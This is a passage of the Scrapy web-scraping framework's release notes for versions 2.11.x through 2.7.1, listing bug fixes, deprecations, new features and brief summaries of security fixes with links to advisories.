:issue:`6358`)\n\n-   :func:`~scrapy.utils.iterators.xmliter_lxml` no longer resolves XML\n    entities. (:issue:`6265`)\n\n-   defusedxml_ is now used to make\n    :class:`scrapy.http.request.rpc.XmlRpcRequest` more secure.\n    (:issue:`6250`, :issue:`6251`)\n\n    .. _defusedxml: https://github.com/tiran/defusedxml\n\nBug fixes\n~~~~~~~~~\n\n-   Restored support for brotlipy_, which had been dropped in Scrapy 2.11.1 in\n    favor of brotli_. (:issue:`6261`)\n\n    .. _brotli: https://github.com/google/brotli\n\n    .. note:: brotlipy is deprecated, both in Scrapy and upstream. Use brotli\n        instead if you can.\n\n-   Make :setting:`METAREFRESH_IGNORE_TAGS` ``[\"noscript\"]`` by default. This\n    prevents\n    :class:`~scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware` from\n    following redirects that would not be followed by web browsers with\n    JavaScript enabled. (:issue:`6342`, :issue:`6347`)\n\n-   During :ref:`feed export <topics-feed-exports>`, do not close the\n    underlying file from :ref:`built-in post-processing plugins\n    <builtin-plugins>`.\n    (:issue:`5932`, :issue:`6178`, :issue:`6239`)\n\n-   :class:`LinkExtractor <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor>`\n    now properly applies the ``unique`` and ``canonicalize`` parameters.\n    (:issue:`3273`, :issue:`6221`)\n\n-   Do not initialize the scheduler disk queue if :setting:`JOBDIR` is an empty\n    string. (:issue:`6121`, :issue:`6124`)\n\n-   Fix :attr:`Spider.logger <scrapy.Spider.logger>` not logging custom extra\n    information. (:issue:`6323`, :issue:`6324`)\n\n-   ``robots.txt`` files with a non-UTF-8 encoding no longer prevent parsing\n    the UTF-8-compatible (e.g. ASCII) parts of the document.\n    (:issue:`6292`, :issue:`6298`)\n\n-   :meth:`scrapy.http.cookies.WrappedRequest.get_header` no longer raises an\n    exception if ``default`` is ``None``.\n    (:issue:`6308`, :issue:`6310`)\n\n-   :class:`~scrapy.selector.Selector` now uses\n    :func:`scrapy.utils.response.get_base_url` to determine the base URL of a\n    given :class:`~scrapy.http.Response`. (:issue:`6265`)\n\n-   The :meth:`media_to_download` method of :ref:`media pipelines\n    <topics-media-pipeline>` now logs exceptions before stripping them.\n    (:issue:`5067`, :issue:`5068`)\n\n-   When passing a callback to the :command:`parse` command, build the callback\n    callable with the right signature.\n    (:issue:`6182`)\n\nDocumentation\n~~~~~~~~~~~~~\n\n-   Add a FAQ entry about :ref:`creating blank requests <faq-blank-request>`.\n    (:issue:`6203`, :issue:`6208`)\n\n-   Document that :attr:`scrapy.selector.Selector.type` can be ``\"json\"``.\n    (:issue:`6328`, :issue:`6334`)\n\nQuality assurance\n~~~~~~~~~~~~~~~~~\n\n-   Make builds reproducible. (:issue:`5019`, :issue:`6322`)\n\n-   Packaging and test fixes.\n    (:issue:`6286`, :issue:`6290`, :issue:`6312`, :issue:`6316`, :issue:`6344`)\n\n\n.. _release-2.11.1:\n\n", "2.11.1": "--------------------------\n\nHighlights:\n\n-   Security bug fixes.\n\n-   Support for Twisted >= 23.8.0.\n\n-   Documentation improvements.\n\nSecurity bug fixes\n~~~~~~~~~~~~~~~~~~\n\n-   Addressed `ReDoS vulnerabilities`_:\n\n    -   ``scrapy.utils.iterators.xmliter`` is now deprecated in favor of\n        :func:`~scrapy.utils.iterators.xmliter_lxml`, which\n        :class:`~scrapy.spiders.XMLFeedSpider` now uses.\n\n        To minimize the impact of this change on existing code,\n        :func:`~scrapy.utils.iterators.xmliter_lxml` now supports indicating\n        the node namespace with a prefix in the node name, and big files with\n        highly nested trees when using libxml2 2.7+.\n\n    -   Fixed regular expressions in the implementation of the\n        :func:`~scrapy.utils.response.open_in_browser` function.\n\n    Please, see the `cc65-xxvf-f7r9 security advisory`_ for more information.\n\n    .. _ReDoS vulnerabilities: https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n    .. _cc65-xxvf-f7r9 security advisory: https://github.com/scrapy/scrapy/security/advisories/GHSA-cc65-xxvf-f7r9\n\n-   :setting:`DOWNLOAD_MAXSIZE` and :setting:`DOWNLOAD_WARNSIZE` now also apply\n    to the decompressed response body. Please, see the `7j7m-v7m3-jqm7 security\n    advisory`_ for more information.\n\n    .. _7j7m-v7m3-jqm7 security advisory: https://github.com/scrapy/scrapy/security/advisories/GHSA-7j7m-v7m3-jqm7\n\n-   Also in relation with the `7j7m-v7m3-jqm7 security advisory`_, the\n    deprecated ``scrapy.downloadermiddlewares.decompression`` module has been\n    removed.\n\n-   The ``Authorization`` header is now dropped on redirects to a different\n    domain. Please, see the `cw9j-q3vf-hrrv security advisory`_ for more\n    information.\n\n    .. _cw9j-q3vf-hrrv security advisory: https://github.com/scrapy/scrapy/security/advisories/GHSA-cw9j-q3vf-hrrv\n\nModified requirements\n~~~~~~~~~~~~~~~~~~~~~\n\n-   The Twisted dependency is no longer restricted to < 23.8.0. (:issue:`6024`,\n    :issue:`6064`, :issue:`6142`)\n\nBug fixes\n~~~~~~~~~\n\n-   The OS signal handling code was refactored to no longer use private Twisted\n    functions. (:issue:`6024`, :issue:`6064`, :issue:`6112`)\n\nDocumentation\n~~~~~~~~~~~~~\n\n-   Improved documentation for :class:`~scrapy.crawler.Crawler` initialization\n    changes made in the 2.11.0 release. (:issue:`6057`, :issue:`6147`)\n\n-   Extended documentation for :attr:`Request.meta <scrapy.http.Request.meta>`.\n    (:issue:`5565`)\n\n-   Fixed the :reqmeta:`dont_merge_cookies` documentation. (:issue:`5936`,\n    :issue:`6077`)\n\n-   Added a link to Zyte's export guides to the :ref:`feed exports\n    <topics-feed-exports>` documentation. (:issue:`6183`)\n\n-   Added a missing note about backward-incompatible changes in\n    :class:`~scrapy.exporters.PythonItemExporter` to the 2.11.0 release notes.\n    (:issue:`6060`, :issue:`6081`)\n\n-   Added a missing note about removing the deprecated\n    ``scrapy.utils.boto.is_botocore()`` function to the 2.8.0 release notes.\n    (:issue:`6056`, :issue:`6061`)\n\n-   Other documentation improvements. (:issue:`6128`, :issue:`6144`,\n    :issue:`6163`, :issue:`6190`, :issue:`6192`)\n\nQuality assurance\n~~~~~~~~~~~~~~~~~\n\n-   Added Python 3.12 to the CI configuration, re-enabled tests that were\n    disabled when the pre-release support was added. (:issue:`5985`,\n    :issue:`6083`, :issue:`6098`)\n\n-   Fixed a test issue on PyPy 7.3.14. (:issue:`6204`, :issue:`6205`)\n\n\n.. _release-2.11.0:\n\n", "2.11.0": "--------------------------\n\nHighlights:\n\n-   Spiders can now modify :ref:`settings <topics-settings>` in their\n    :meth:`~scrapy.Spider.from_crawler` methods, e.g. based on :ref:`spider\n    arguments <spiderargs>`.\n\n-   Periodic logging of stats.\n\n\nBackward-incompatible changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n-   Most of the initialization of :class:`scrapy.crawler.Crawler` instances is\n    now done in :meth:`~scrapy.crawler.Crawler.crawl`, so the state of\n    instances before that method is called is now different compared to older\n    Scrapy versions. We do not recommend using the\n    :class:`~scrapy.crawler.Crawler` instances before\n    :meth:`~scrapy.crawler.Crawler.crawl` is called. (:issue:`6038`)\n\n-   :meth:`scrapy.Spider.from_crawler` is now called before the initialization\n    of various components previously initialized in\n    :meth:`scrapy.crawler.Crawler.__init__` and before the settings are\n    finalized and frozen. This change was needed to allow changing the settings\n    in :meth:`scrapy.Spider.from_crawler`. If you want to access the final\n    setting values and the initialized :class:`~scrapy.crawler.Crawler`\n    attributes in the spider code as early as possible you can do this in\n    :meth:`~scrapy.Spider.start_requests` or in a handler of the\n    :signal:`engine_started` signal. (:issue:`6038`)\n\n-   The :meth:`TextResponse.json <scrapy.http.TextResponse.json>` method now\n    requires the response to be in a valid JSON encoding (UTF-8, UTF-16, or\n    UTF-32). If you need to deal with JSON documents in an invalid encoding,\n    use ``json.loads(response.text)`` instead. (:issue:`6016`)\n\n-   :class:`~scrapy.exporters.PythonItemExporter` used the binary output by\n    default but it no longer does. (:issue:`6006`, :issue:`6007`)\n\nDeprecation removals\n~~~~~~~~~~~~~~~~~~~~\n\n-   Removed the binary export mode of\n    :class:`~scrapy.exporters.PythonItemExporter`, deprecated in Scrapy 1.1.0.\n    (:issue:`6006`, :issue:`6007`)\n\n    .. note:: If you are using this Scrapy version on Scrapy Cloud with a stack\n              that includes an older Scrapy version and get a \"TypeError:\n              Unexpected options: binary\" error, you may need to add\n              ``scrapinghub-entrypoint-scrapy >= 0.14.1`` to your project\n              requirements or switch to a stack that includes Scrapy 2.11.\n\n-   Removed the ``CrawlerRunner.spiders`` attribute, deprecated in Scrapy\n    1.0.0, use :attr:`CrawlerRunner.spider_loader\n    <scrapy.crawler.CrawlerRunner.spider_loader>` instead. (:issue:`6010`)\n\n-   The :func:`scrapy.utils.response.response_httprepr` function, deprecated in\n    Scrapy 2.6.0, has now been removed. (:issue:`6111`)\n\nDeprecations\n~~~~~~~~~~~~\n\n-   Running :meth:`~scrapy.crawler.Crawler.crawl` more than once on the same\n    :class:`scrapy.crawler.Crawler` instance is now deprecated. (:issue:`1587`,\n    :issue:`6040`)\n\nNew features\n~~~~~~~~~~~~\n\n-   Spiders can now modify settings in their\n    :meth:`~scrapy.Spider.from_crawler` method, e.g. based on :ref:`spider\n    arguments <spiderargs>`. (:issue:`1305`, :issue:`1580`, :issue:`2392`,\n    :issue:`3663`, :issue:`6038`)\n\n-   Added the :class:`~scrapy.extensions.periodic_log.PeriodicLog` extension\n    which can be enabled to log stats and/or their differences periodically.\n    (:issue:`5926`)\n\n-   Optimized the memory usage in :meth:`TextResponse.json\n    <scrapy.http.TextResponse.json>` by removing unnecessary body decoding.\n    (:issue:`5968`, :issue:`6016`)\n\n-   Links to ``.webp`` files are now ignored by :ref:`link extractors\n    <topics-link-extractors>`. (:issue:`6021`)\n\nBug fixes\n~~~~~~~~~\n\n-   Fixed logging enabled add-ons. (:issue:`6036`)\n\n-   Fixed :class:`~scrapy.mail.MailSender` producing invalid message bodies\n    when the ``charset`` argument is passed to\n    :meth:`~scrapy.mail.MailSender.send`. (:issue:`5096`, :issue:`5118`)\n\n-   Fixed an exception when accessing ``self.EXCEPTIONS_TO_RETRY`` from a\n    subclass of :class:`~scrapy.downloadermiddlewares.retry.RetryMiddleware`.\n    (:issue:`6049`, :issue:`6050`)\n\n-   :meth:`scrapy.settings.BaseSettings.getdictorlist`, used to parse\n    :setting:`FEED_EXPORT_FIELDS`, now handles tuple values. (:issue:`6011`,\n    :issue:`6013`)\n\n-   Calls to ``datetime.utcnow()``, no longer recommended to be used, have been\n    replaced with calls to ``datetime.now()`` with a timezone. (:issue:`6014`)\n\nDocumentation\n~~~~~~~~~~~~~\n\n-   Updated a deprecated function call in a pipeline example. (:issue:`6008`,\n    :issue:`6009`)\n\nQuality assurance\n~~~~~~~~~~~~~~~~~\n\n-   Extended typing hints. (:issue:`6003`, :issue:`6005`, :issue:`6031`,\n    :issue:`6034`)\n\n-   Pinned brotli_ to 1.0.9 for the PyPy tests as 1.1.0 breaks them.\n    (:issue:`6044`, :issue:`6045`)\n\n-   Other CI and pre-commit improvements. (:issue:`6002`, :issue:`6013`,\n    :issue:`6046`)\n\n.. _release-2.10.1:\n\n", "2.10.1": "--------------------------\n\nMarked ``Twisted >= 23.8.0`` as unsupported. (:issue:`6024`, :issue:`6026`)\n\n.. _release-2.10.0:\n\n", "2.10.0": "--------------------------\n\nHighlights:\n\n-   Added Python 3.12 support, dropped Python 3.7 support.\n\n-   The new add-ons framework simplifies configuring 3rd-party components that\n    support it.\n\n-   Exceptions to retry can now be configured.\n\n-   Many fixes and improvements for feed exports.\n\nModified requirements\n~~~~~~~~~~~~~~~~~~~~~\n\n-   Dropped support for Python 3.7. (:issue:`5953`)\n\n-   Added support for the upcoming Python 3.12. (:issue:`5984`)\n\n-   Minimum versions increased for these dependencies:\n\n    -   lxml_: 4.3.0 \u2192 4.4.1\n\n    -   cryptography_: 3.4.6 \u2192 36.0.0\n\n-   ``pkg_resources`` is no longer used. (:issue:`5956`, :issue:`5958`)\n\n-   boto3_ is now recommended instead of botocore_ for exporting to S3.\n    (:issue:`5833`).\n\nBackward-incompatible changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n-   The value of the :setting:`FEED_STORE_EMPTY` setting is now ``True`` \n    instead of ``False``. In earlier Scrapy versions empty files were created \n    even when this setting was ``False`` (which was a bug that is now fixed), \n    so the new default should keep the old behavior. (:issue:`872`, \n    :issue:`5847`)\n\nDeprecation removals\n~~~~~~~~~~~~~~~~~~~~\n\n-   When a function is assigned to the :setting:`FEED_URI_PARAMS` setting,\n    returning ``None`` or modifying the ``params`` input parameter, deprecated\n    in Scrapy 2.6, is no longer supported. (:issue:`5994`, :issue:`5996`)\n\n-   The ``scrapy.utils.reqser`` module, deprecated in Scrapy 2.6, is removed.\n    (:issue:`5994`, :issue:`5996`)\n\n-   The ``scrapy.squeues`` classes ``PickleFifoDiskQueueNonRequest``,\n    ``PickleLifoDiskQueueNonRequest``, ``MarshalFifoDiskQueueNonRequest``,\n    and ``MarshalLifoDiskQueueNonRequest``, deprecated in\n    Scrapy 2.6, are removed. (:issue:`5994`, :issue:`5996`)\n\n-   The property ``open_spiders`` and the methods ``has_capacity`` and\n    ``schedule`` of :class:`scrapy.core.engine.ExecutionEngine`,\n    deprecated in Scrapy 2.6, are removed. (:issue:`5994`, :issue:`5998`)\n\n-   Passing a ``spider`` argument to the\n    :meth:`~scrapy.core.engine.ExecutionEngine.spider_is_idle`,\n    :meth:`~scrapy.core.engine.ExecutionEngine.crawl` and\n    :meth:`~scrapy.core.engine.ExecutionEngine.download` methods of\n    :class:`scrapy.core.engine.ExecutionEngine`, deprecated in Scrapy 2.6, is\n    no longer supported. (:issue:`5994`, :issue:`5998`)\n\nDeprecations\n~~~~~~~~~~~~\n\n-   :class:`scrapy.utils.datatypes.CaselessDict` is deprecated, use\n    :class:`scrapy.utils.datatypes.CaseInsensitiveDict` instead.\n    (:issue:`5146`)\n\n-   Passing the ``custom`` argument to\n    :func:`scrapy.utils.conf.build_component_list` is deprecated, it was used\n    in the past to merge ``FOO`` and ``FOO_BASE`` setting values but now Scrapy\n    uses :func:`scrapy.settings.BaseSettings.getwithbase` to do the same.\n    Code that uses this argument and cannot be switched to ``getwithbase()``\n    can be switched to merging the values explicitly. (:issue:`5726`,\n    :issue:`5923`)\n\nNew features\n~~~~~~~~~~~~\n\n-   Added support for :ref:`Scrapy add-ons <topics-addons>`. (:issue:`5950`)\n\n-   Added the :setting:`RETRY_EXCEPTIONS` setting that configures which\n    exceptions will be retried by\n    :class:`~scrapy.downloadermiddlewares.retry.RetryMiddleware`.\n    (:issue:`2701`, :issue:`5929`)\n\n-   Added the possiiblity to close the spider if no items were produced in the\n    specified time, configured by :setting:`CLOSESPIDER_TIMEOUT_NO_ITEM`.\n    (:issue:`5979`)\n\n-   Added support for the :setting:`AWS_REGION_NAME` setting to feed exports.\n    (:issue:`5980`)\n\n-   Added support for using :class:`pathlib.Path` objects that refer to\n    absolute Windows paths in the :setting:`FEEDS` setting. (:issue:`5939`)\n\nBug fixes\n~~~~~~~~~\n\n-   Fixed creating empty feeds even with ``FEED_STORE_EMPTY=False``.\n    (:issue:`872`, :issue:`5847`)\n\n-   Fixed using absolute Windows paths when specifying output files.\n    (:issue:`5969`, :issue:`5971`)\n\n-   Fixed problems with uploading large files to S3 by switching to multipart\n    uploads (requires boto3_). (:issue:`960`, :issue:`5735`, :issue:`5833`)\n\n-   Fixed the JSON exporter writing extra commas when some exceptions occur.\n    (:issue:`3090`, :issue:`5952`)\n\n-   Fixed the \"read of closed file\" error in the CSV exporter. (:issue:`5043`,\n    :issue:`5705`)\n\n-   Fixed an error when a component added by the class object throws\n    :exc:`~scrapy.exceptions.NotConfigured` with a message. (:issue:`5950`,\n    :issue:`5992`)\n\n-   Added the missing :meth:`scrapy.settings.BaseSettings.pop` method.\n    (:issue:`5959`, :issue:`5960`, :issue:`5963`)\n\n-   Added :class:`~scrapy.utils.datatypes.CaseInsensitiveDict` as a replacement\n    for :class:`~scrapy.utils.datatypes.CaselessDict` that fixes some API\n    inconsistencies. (:issue:`5146`)\n\nDocumentation\n~~~~~~~~~~~~~\n\n-   Documented :meth:`scrapy.Spider.update_settings`. (:issue:`5745`,\n    :issue:`5846`)\n\n-   Documented possible problems with early Twisted reactor installation and\n    their solutions. (:issue:`5981`, :issue:`6000`)\n\n-   Added examples of making additional requests in callbacks. (:issue:`5927`)\n\n-   Improved the feed export docs. (:issue:`5579`, :issue:`5931`)\n\n-   Clarified the docs about request objects on redirection. (:issue:`5707`,\n    :issue:`5937`)\n\nQuality assurance\n~~~~~~~~~~~~~~~~~\n\n-   Added support for running tests against the installed Scrapy version.\n    (:issue:`4914`, :issue:`5949`)\n\n-   Extended typing hints. (:issue:`5925`, :issue:`5977`)\n\n-   Fixed the ``test_utils_asyncio.AsyncioTest.test_set_asyncio_event_loop``\n    test. (:issue:`5951`)\n\n-   Fixed the ``test_feedexport.BatchDeliveriesTest.test_batch_path_differ``\n    test on Windows. (:issue:`5847`)\n\n-   Enabled CI runs for Python 3.11 on Windows. (:issue:`5999`)\n\n-   Simplified skipping tests that depend on ``uvloop``. (:issue:`5984`)\n\n-   Fixed the ``extra-deps-pinned`` tox env. (:issue:`5948`)\n\n-   Implemented cleanups. (:issue:`5965`, :issue:`5986`)\n\n.. _release-2.9.0:\n\n", "2.9.0": "-------------------------\n\nHighlights:\n\n-   Per-domain download settings.\n-   Compatibility with new cryptography_ and new parsel_.\n-   JMESPath selectors from the new parsel_.\n-   Bug fixes.\n\nDeprecations\n~~~~~~~~~~~~\n\n-   :class:`scrapy.extensions.feedexport._FeedSlot` is renamed to\n    :class:`scrapy.extensions.feedexport.FeedSlot` and the old name is\n    deprecated. (:issue:`5876`)\n\nNew features\n~~~~~~~~~~~~\n\n-   Settings corresponding to :setting:`DOWNLOAD_DELAY`,\n    :setting:`CONCURRENT_REQUESTS_PER_DOMAIN` and\n    :setting:`RANDOMIZE_DOWNLOAD_DELAY` can now be set on a per-domain basis\n    via the new :setting:`DOWNLOAD_SLOTS` setting. (:issue:`5328`)\n\n-   Added :meth:`TextResponse.jmespath`, a shortcut for JMESPath selectors\n    available since parsel_ 1.8.1. (:issue:`5894`, :issue:`5915`)\n\n-   Added :signal:`feed_slot_closed` and :signal:`feed_exporter_closed`\n    signals. (:issue:`5876`)\n\n-   Added :func:`scrapy.utils.request.request_to_curl`, a function to produce a\n    curl command from a :class:`~scrapy.Request` object. (:issue:`5892`)\n\n-   Values of :setting:`FILES_STORE` and :setting:`IMAGES_STORE` can now be\n    :class:`pathlib.Path` instances. (:issue:`5801`)\n\nBug fixes\n~~~~~~~~~\n\n-   Fixed a warning with Parsel 1.8.1+. (:issue:`5903`, :issue:`5918`)\n\n-   Fixed an error when using feed postprocessing with S3 storage.\n    (:issue:`5500`, :issue:`5581`)\n\n-   Added the missing :meth:`scrapy.settings.BaseSettings.setdefault` method.\n    (:issue:`5811`, :issue:`5821`)\n\n-   Fixed an error when using cryptography_ 40.0.0+ and\n    :setting:`DOWNLOADER_CLIENT_TLS_VERBOSE_LOGGING` is enabled.\n    (:issue:`5857`, :issue:`5858`)\n\n-   The checksums returned by :class:`~scrapy.pipelines.files.FilesPipeline`\n    for files on Google Cloud Storage are no longer Base64-encoded.\n    (:issue:`5874`, :issue:`5891`)\n\n-   :func:`scrapy.utils.request.request_from_curl` now supports $-prefixed\n    string values for the curl ``--data-raw`` argument, which are produced by\n    browsers for data that includes certain symbols. (:issue:`5899`,\n    :issue:`5901`)\n\n-   The :command:`parse` command now also works with async generator callbacks.\n    (:issue:`5819`, :issue:`5824`)\n\n-   The :command:`genspider` command now properly works with HTTPS URLs.\n    (:issue:`3553`, :issue:`5808`)\n\n-   Improved handling of asyncio loops. (:issue:`5831`, :issue:`5832`)\n\n-   :class:`LinkExtractor <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor>`\n    now skips certain malformed URLs instead of raising an exception.\n    (:issue:`5881`)\n\n-   :func:`scrapy.utils.python.get_func_args` now supports more types of\n    callables. (:issue:`5872`, :issue:`5885`)\n\n-   Fixed an error when processing non-UTF8 values of ``Content-Type`` headers.\n    (:issue:`5914`, :issue:`5917`)\n\n-   Fixed an error breaking user handling of send failures in\n    :meth:`scrapy.mail.MailSender.send()`. (:issue:`1611`, :issue:`5880`)\n\nDocumentation\n~~~~~~~~~~~~~\n\n-   Expanded contributing docs. (:issue:`5109`, :issue:`5851`)\n\n-   Added blacken-docs_ to pre-commit and reformatted the docs with it.\n    (:issue:`5813`, :issue:`5816`)\n\n-   Fixed a JS issue. (:issue:`5875`, :issue:`5877`)\n\n-   Fixed ``make htmlview``. (:issue:`5878`, :issue:`5879`)\n\n-   Fixed typos and other small errors. (:issue:`5827`, :issue:`5839`,\n    :issue:`5883`, :issue:`5890`, :issue:`5895`, :issue:`5904`)\n\nQuality assurance\n~~~~~~~~~~~~~~~~~\n\n-   Extended typing hints. (:issue:`5805`, :issue:`5889`, :issue:`5896`)\n\n-   Tests for most of the examples in the docs are now run as a part of CI,\n    found problems were fixed. (:issue:`5816`, :issue:`5826`, :issue:`5919`)\n\n-   Removed usage of deprecated Python classes. (:issue:`5849`)\n\n-   Silenced ``include-ignored`` warnings from coverage. (:issue:`5820`)\n\n-   Fixed a random failure of the ``test_feedexport.test_batch_path_differ``\n    test. (:issue:`5855`, :issue:`5898`)\n\n-   Updated docstrings to match output produced by parsel_ 1.8.1 so that they\n    don't cause test failures. (:issue:`5902`, :issue:`5919`)\n\n-   Other CI and pre-commit improvements. (:issue:`5802`, :issue:`5823`,\n    :issue:`5908`)\n\n.. _blacken-docs: https://github.com/adamchainz/blacken-docs\n\n.. _release-2.8.0:\n\n", "2.8.0": "-------------------------\n\nThis is a maintenance release, with minor features, bug fixes, and cleanups.\n\nDeprecation removals\n~~~~~~~~~~~~~~~~~~~~\n\n-   The ``scrapy.utils.gz.read1`` function, deprecated in Scrapy 2.0, has now\n    been removed. Use the :meth:`~io.BufferedIOBase.read1` method of\n    :class:`~gzip.GzipFile` instead.\n    (:issue:`5719`)\n\n-   The ``scrapy.utils.python.to_native_str`` function, deprecated in Scrapy\n    2.0, has now been removed. Use :func:`scrapy.utils.python.to_unicode`\n    instead.\n    (:issue:`5719`)\n\n-   The ``scrapy.utils.python.MutableChain.next`` method, deprecated in Scrapy\n    2.0, has now been removed. Use\n    :meth:`~scrapy.utils.python.MutableChain.__next__` instead.\n    (:issue:`5719`)\n\n-   The ``scrapy.linkextractors.FilteringLinkExtractor`` class, deprecated\n    in Scrapy 2.0, has now been removed. Use\n    :class:`LinkExtractor <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor>`\n    instead.\n    (:issue:`5720`)\n\n-   Support for using environment variables prefixed with ``SCRAPY_`` to\n    override settings, deprecated in Scrapy 2.0, has now been removed.\n    (:issue:`5724`)\n\n-   Support for the ``noconnect`` query string argument in proxy URLs,\n    deprecated in Scrapy 2.0, has now been removed. We expect proxies that used\n    to need it to work fine without it.\n    (:issue:`5731`)\n\n-   The ``scrapy.utils.python.retry_on_eintr`` function, deprecated in Scrapy\n    2.3, has now been removed.\n    (:issue:`5719`)\n\n-   The ``scrapy.utils.python.WeakKeyCache`` class, deprecated in Scrapy 2.4,\n    has now been removed.\n    (:issue:`5719`)\n\n-   The ``scrapy.utils.boto.is_botocore()`` function, deprecated in Scrapy 2.4,\n    has now been removed.\n    (:issue:`5719`)\n\n\nDeprecations\n~~~~~~~~~~~~\n\n-   :exc:`scrapy.pipelines.images.NoimagesDrop` is now deprecated.\n    (:issue:`5368`, :issue:`5489`)\n\n-   :meth:`ImagesPipeline.convert_image\n    <scrapy.pipelines.images.ImagesPipeline.convert_image>` must now accept a\n    ``response_body`` parameter.\n    (:issue:`3055`, :issue:`3689`, :issue:`4753`)\n\n\nNew features\n~~~~~~~~~~~~\n\n-   Applied black_ coding style to files generated with the\n    :command:`genspider` and :command:`startproject` commands.\n    (:issue:`5809`, :issue:`5814`)\n\n    .. _black: https://black.readthedocs.io/en/stable/\n\n-   :setting:`FEED_EXPORT_ENCODING` is now set to ``\"utf-8\"`` in the\n    ``settings.py`` file that the :command:`startproject` command generates.\n    With this value, JSON exports won\u2019t force the use of escape sequences for\n    non-ASCII characters.\n    (:issue:`5797`, :issue:`5800`)\n\n-   The :class:`~scrapy.extensions.memusage.MemoryUsage` extension now logs the\n    peak memory usage during checks, and the binary unit MiB is now used to\n    avoid confusion.\n    (:issue:`5717`, :issue:`5722`, :issue:`5727`)\n\n-   The ``callback`` parameter of :class:`~scrapy.http.Request` can now be set\n    to :func:`scrapy.http.request.NO_CALLBACK`, to distinguish it from\n    ``None``, as the latter indicates that the default spider callback\n    (:meth:`~scrapy.Spider.parse`) is to be used.\n    (:issue:`5798`)\n\n\nBug fixes\n~~~~~~~~~\n\n-   Enabled unsafe legacy SSL renegotiation to fix access to some outdated\n    websites.\n    (:issue:`5491`, :issue:`5790`)\n\n-   Fixed STARTTLS-based email delivery not working with Twisted 21.2.0 and\n    better.\n    (:issue:`5386`, :issue:`5406`)\n\n-   Fixed the :meth:`finish_exporting` method of :ref:`item exporters\n    <topics-exporters>` not being called for empty files.\n    (:issue:`5537`, :issue:`5758`)\n\n-   Fixed HTTP/2 responses getting only the last value for a header when\n    multiple headers with the same name are received.\n    (:issue:`5777`)\n\n-   Fixed an exception raised by the :command:`shell` command on some cases\n    when :ref:`using asyncio <using-asyncio>`.\n    (:issue:`5740`, :issue:`5742`, :issue:`5748`, :issue:`5759`, :issue:`5760`,\n    :issue:`5771`)\n\n-   When using :class:`~scrapy.spiders.CrawlSpider`, callback keyword arguments\n    (``cb_kwargs``) added to a request in the ``process_request`` callback of a\n    :class:`~scrapy.spiders.Rule` will no longer be ignored.\n    (:issue:`5699`)\n\n-   The :ref:`images pipeline <images-pipeline>` no longer re-encodes JPEG\n    files.\n    (:issue:`3055`, :issue:`3689`, :issue:`4753`)\n\n-   Fixed the handling of transparent WebP images by the :ref:`images pipeline\n    <images-pipeline>`.\n    (:issue:`3072`, :issue:`5766`, :issue:`5767`)\n\n-   :func:`scrapy.shell.inspect_response` no longer inhibits ``SIGINT``\n    (Ctrl+C).\n    (:issue:`2918`)\n\n-   :class:`LinkExtractor <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor>`\n    with ``unique=False`` no longer filters out links that have identical URL\n    *and* text.\n    (:issue:`3798`, :issue:`3799`, :issue:`4695`, :issue:`5458`)\n\n-   :class:`~scrapy.downloadermiddlewares.robotstxt.RobotsTxtMiddleware` now\n    ignores URL protocols that do not support ``robots.txt`` (``data://``,\n    ``file://``).\n    (:issue:`5807`)\n\n-   Silenced the ``filelock`` debug log messages introduced in Scrapy 2.6.\n    (:issue:`5753`, :issue:`5754`)\n\n-   Fixed the output of ``scrapy -h`` showing an unintended ``**commands**``\n    line.\n    (:issue:`5709`, :issue:`5711`, :issue:`5712`)\n\n-   Made the active project indication in the output of :ref:`commands\n    <topics-commands>` more clear.\n    (:issue:`5715`)\n\n\nDocumentation\n~~~~~~~~~~~~~\n\n-   Documented how to :ref:`debug spiders from Visual Studio Code\n    <debug-vscode>`.\n    (:issue:`5721`)\n\n-   Documented how :setting:`DOWNLOAD_DELAY` affects per-domain concurrency.\n    (:issue:`5083`, :issue:`5540`)\n\n-   Improved consistency.\n    (:issue:`5761`)\n\n-   Fixed typos.\n    (:issue:`5714`, :issue:`5744`, :issue:`5764`)\n\n\nQuality assurance\n~~~~~~~~~~~~~~~~~\n\n-   Applied :ref:`black coding style <coding-style>`, sorted import statements,\n    and introduced :ref:`pre-commit <scrapy-pre-commit>`.\n    (:issue:`4654`, :issue:`4658`, :issue:`5734`, :issue:`5737`, :issue:`5806`,\n    :issue:`5810`)\n\n-   Switched from :mod:`os.path` to :mod:`pathlib`.\n    (:issue:`4916`, :issue:`4497`, :issue:`5682`)\n\n-   Addressed many issues reported by Pylint.\n    (:issue:`5677`)\n\n-   Improved code readability.\n    (:issue:`5736`)\n\n-   Improved package metadata.\n    (:issue:`5768`)\n\n-   Removed direct invocations of ``setup.py``.\n    (:issue:`5774`, :issue:`5776`)\n\n-   Removed unnecessary :class:`~collections.OrderedDict` usages.\n    (:issue:`5795`)\n\n-   Removed unnecessary ``__str__`` definitions.\n    (:issue:`5150`)\n\n-   Removed obsolete code and comments.\n    (:issue:`5725`, :issue:`5729`, :issue:`5730`, :issue:`5732`)\n\n-   Fixed test and CI issues.\n    (:issue:`5749`, :issue:`5750`, :issue:`5756`, :issue:`5762`, :issue:`5765`,\n    :issue:`5780`, :issue:`5781`, :issue:`5782`, :issue:`5783`, :issue:`5785`,\n    :issue:`5786`)\n\n\n.. _release-2.7.1:\n\n", "2.7.1": "-------------------------\n\nNew features\n~~~~~~~~~~~~\n\n-   Relaxed the restriction introduced in 2.6.2 so that the\n    ``Proxy-Authorization`` header can again be set explicitly, as long as the\n    proxy URL in the :reqmeta:`proxy` metadata has no other credentials, and\n    for as long as that proxy URL remains the same; this restores compatibility\n    with scrapy-zyte-smartproxy 2.1.0 and older (:issue:`5626`).\n\nBug fixes\n~~~~~~~~~\n\n-   Using ``-O``/``--overwrite-output`` and ``-t``/``--output-format`` options\n    together now produces an error instead of ignoring the former option\n    (:issue:`5516`, :issue:`5605`).\n\n-   Replaced deprecated :mod:`asyncio` APIs that implicitly use the current\n    event loop with code that explicitly requests a loop from the event loop\n    policy (:issue:`5685`, :issue:`5689`).\n\n-   Fixed uses of deprecated Scrapy APIs in Scrapy itself (:issue:`5588`,\n    :issue:`5589`).\n\n-   Fixed uses of a deprecated Pillow API (:issue:`5684`, :issue:`5692`).\n\n-   Improved code that checks if generators return values, so that it no longer\n    fails on decorated methods and partial methods 